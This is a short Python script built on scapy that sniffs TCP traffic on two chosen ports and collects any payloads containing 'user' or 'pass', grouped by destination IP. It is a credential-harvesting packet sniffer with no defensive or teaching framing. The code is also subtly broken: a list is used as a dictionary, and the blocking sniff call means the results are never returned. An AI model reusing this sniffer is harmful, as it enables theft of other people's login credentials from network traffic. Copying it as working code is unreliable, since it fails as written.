from scapy.all import sniff, TCP, IP

def sniff_for_credentials(port1, port2):
    results = []

    # Maybe change the scope of this so i can say what i want to sniff ..?
    def packet_callback(packet):
        if packet[TCP].payload:
            mypacket = str(packet[TCP].payload)
            if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
                destination_ip = packet[IP].dst
                payload = str(packet[TCP].payload)

                if destination_ip in results:
                    results[destination_ip].append(payload)
                else:
                    results[destination_ip] = [payload]

    sniff(filter=f'tcp port {port1} or tcp port {port2}',
          prn=packet_callback, store=0)

    return results
